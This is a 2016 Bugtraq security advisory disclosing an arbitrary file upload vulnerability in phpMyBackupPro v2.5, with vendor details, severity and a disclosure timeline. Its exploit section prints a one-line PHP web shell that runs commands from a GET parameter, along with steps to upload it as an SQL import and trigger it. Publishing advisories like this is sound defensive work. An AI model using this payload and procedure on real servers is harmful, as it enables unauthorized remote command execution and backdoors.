
Date: Tue, 16 Feb 2016 05:48:24 GMT
From: hyp3rlinx@...os.com
To: bugtraq@...urityfocus.com
Subject: phpMyBackupPro v.2.5 Arbitrary File Upload

[+] Credits: hyp3rlinx

[+] Website: hyp3rlinx.altervista.org

[+] Source:  http://hyp3rlinx.altervista.org/advisories/PHPMYBACKUPPRO-v2.5-FILE_UPLOAD_VULN.txt



Vendor:
=============================
www.phpmybackuppro.net

project site:
sourceforge.net/projects/phpmybackup/



Product:
===========================
phpMyBackupPro v.2.5 (PMBP)

phpMyBackup Pro is a very easy to use, free, web-based MySQL backup application, licensed under the GNU GPL.
You can create scheduled backups, manage and restore them, download or email them and a lot more.



Vulnerability Type:
========================
Arbitrary File Upload



CVE Reference:
==============
N/A



Vulnerability Details:
=====================

phpMyBackupPro allows SQL uploads but fails to check the actual file type, allowing arbitrary file uploads which
can lead to arbitrary OS command, backdoor shells etc...



Exploit code(s):
===============

Arbitary File Upload under "database queries" user has option to 'Upload sql file':

1) upload malicious PHP file containing <?php exec(@$_GET['cmd']); ?> as an SQL import using select "fragmented".
2) click 'Yes' when prompted 'Do you really want to import this backup?' 
3) make HTTP request to process the uploaded PHP file e.g. http://localhost/phpMyBackupPro-2.5/export/EVIL.php and BOOOOOOM!

'export' directory comes unprotected with no .htaccess file etc.. and most important file upload type is not checked.



Disclosure Timeline:
=====================================
Vendor Notification:  NR
February 16, 2016  : Public Disclosure



Exploitation Technique:
=======================
Local



Severity Level:
================
High



Description:
=============================================================

Request Method(s):        [+]  POST


Vulnerable Product:       [+]  phpMyBackupPro v.2.5 (PMBP)


============================================================

[+] Disclaimer
Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author.
The author is not responsible for any misuse of the information contained herein and prohibits any malicious use of all security related information or exploits by the author or elsewhere.

by hyp3rlinx
